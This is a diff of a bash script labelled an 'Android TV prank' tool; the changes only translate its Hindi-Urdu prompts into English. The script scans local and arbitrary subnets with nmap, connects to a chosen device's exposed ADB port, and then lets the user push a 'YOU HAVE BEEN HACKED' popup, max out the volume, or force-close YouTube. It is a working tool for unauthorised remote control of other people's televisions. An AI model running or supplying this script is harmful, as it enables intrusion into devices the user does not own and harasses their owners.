@@ -11,11 +11,11 @@ echo
 
 # Check dependencies
 if ! command -v adb &> /dev/null; then
-    echo "[!] adb install nahi hai. Pehle install karo: sudo apt install adb -y"
+    echo "[!] adb is not installed. Install it first: sudo apt install adb -y"
     exit 1
 fi
 if ! command -v nmap &> /dev/null; then
-    echo "[!] nmap install nahi hai. Pehle install karo: sudo apt install nmap -y"
+    echo "[!] nmap is not installed. Install it first: sudo apt install nmap -y"
     exit 1
 fi
 
@@ -24,7 +24,7 @@ echo "Choose Scan Mode:"
 echo "1) Local Network Scan"
 echo "2) Router Network Scan"
 echo "3) Other Network (manual subnet input)"
-echo "4) Auto Detect (sab networks scan karo)"
+echo "4) Auto Detect (scan multiple networks)"
 read -p "Option (1-4): " scan_choice
 
 scan_file="scan.txt"
@@ -43,12 +43,12 @@ elif [ "$scan_choice" == "2" ]; then
     nmap -sn $SUBNET >> $scan_file
 
 elif [ "$scan_choice" == "3" ]; then
-    read -p "Subnet daalo (jaise 192.168.1.0/24): " SUBNET
+    read -p "Enter subnet (e.g. 192.168.1.0/24): " SUBNET
     echo "[*] Custom Network Scan: $SUBNET"
     nmap -sn $SUBNET >> $scan_file
 
 elif [ "$scan_choice" == "4" ]; then
-    echo "[*] Auto Detect Mode: Multiple networks scan ho rahe hain..."
+    echo "[*] Auto Detect Mode: Scanning multiple networks..."
     # Local subnet
     LOCAL_SUB=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}/\d+' | head -n 1)
     if [ ! -z "$LOCAL_SUB" ]; then
@@ -70,7 +70,7 @@ elif [ "$scan_choice" == "4" ]; then
     echo "[*] Extra: 10.0.0.0/24"
     nmap -sn 10.0.0.0/24 >> $scan_file
 else
-    echo "Galat choice! Exit..."
+    echo "Invalid choice! Exiting..."
     exit 1
 fi
 
@@ -105,23 +105,23 @@ while read -r line; do
 done < $scan_file
 
 if [ $i -eq 1 ]; then
-    echo "[!] Koi device nahi mila!"
+    echo "[!] No devices found!"
     exit 1
 fi
 
 echo "================================"
-read -p "Konsa device choose karna hai (number): " choice
+read -p "Select device (number): " choice
 TV_IP=${ips[$choice]}
 
 if [ -z "$TV_IP" ]; then
-    echo "Galat choice! Exit..."
+    echo "Invalid choice! Exiting..."
     exit 1
 fi
 
-read -p "Port number daalo (default 5555): " TV_PORT
+read -p "Enter port number (default 5555): " TV_PORT
 TV_PORT=${TV_PORT:-5555}
 
-echo "[*] Device se connect ho raha hoon: $TV_IP:$TV_PORT"
+echo "[*] Connecting to device: $TV_IP:$TV_PORT"
 adb connect $TV_IP:$TV_PORT
 adb devices
 
@@ -136,34 +136,34 @@ while true; do
     echo
     echo "====== ANDROID TV PRANK MENU ======"
     echo "1) Popup Message (YOU HAVE BEEN HACKED)"
-    echo "2) Volume Full"
-    echo "3) Band Karo YouTube"
+    echo "2) Set Volume to Maximum"
+    echo "3) Force Close YouTube"
     echo "4) Disconnect & Exit"
     echo "===================================="
-    read -p "Apna choice daalo (1-4): " option
+    read -p "Choose an option (1-4): " option
 
     case $option in
         1)
-            echo "[*] Popup bhej raha hoon..."
+            echo "[*] Sending popup..."
             adb shell am start -a android.intent.action.WEB_SEARCH --es query "YOU HAVE BEEN HACKED"
             ;;
         2)
-            echo "[*] Volume full kar raha hoon..."
+            echo "[*] Setting volume to maximum..."
             adb shell media volume --set 15
             ;;
         3)
-            echo "[*] YouTube band kar raha hoon..."
+            echo "[*] Closing YouTube..."
             adb shell am force-stop com.google.android.youtube.tv
             ;;
         4)
-            echo "[*] Disconnect kar raha hoon aur exit..."
+            echo "[*] Disconnecting and exiting..."
             adb disconnect $TV_IP:$TV_PORT
             exit 0
             ;;
         *)
-            echo "Galat option! 1-4 select karo."
+            echo "Invalid option! Choose 1-4."
             ;;
     esac
     echo
-    read -p "Enter dabao continue karne ke liye..."
+    read -p "Press Enter to continue..."
 done
